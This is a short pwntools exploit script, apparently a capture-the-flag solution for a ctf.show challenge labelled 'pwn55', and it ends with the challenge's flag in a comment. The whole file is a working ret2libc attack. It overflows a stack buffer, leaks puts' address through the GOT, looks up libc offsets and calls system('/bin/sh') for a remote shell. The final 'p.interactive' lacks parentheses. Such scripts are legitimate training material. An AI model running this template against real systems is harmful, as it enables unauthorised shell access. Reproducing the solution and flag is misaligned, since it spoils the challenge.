#pwn55 ret2libc or bypass
#ret2libc
from pwn import *
from LibcSearcher import *
e = ELF("./pwn")
p = remote('pwn.challenge.ctf.show', 28172)

offset = 0x2C + 0x4
puts_got = e.got['puts']
puts_plt = e.plt['puts']
main_addr = e.sym['main']

payload1 = b'a' * offset + p32(puts_plt) + p32(main_addr) + p32(puts_got)
p.recvuntil("How to find flag?")
p.sendline(payload1)
puts_addr = u32(p.recvuntil('\xf7')[-4:])
print(hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')

sys_addr = libc_base + libc.dump('system')
sh_addr = libc_base + libc.dump('str_bin_sh')

payload2 = b'a' * offset + p32(sys_addr) + p32(0) + p32(sh_addr)
p.recvuntil("How to find flag?")
p.sendline(payload2)
p.interactive
#ctfshow{bd1d749c-ae9b-4cd2-9ea8-35899d88f7f5}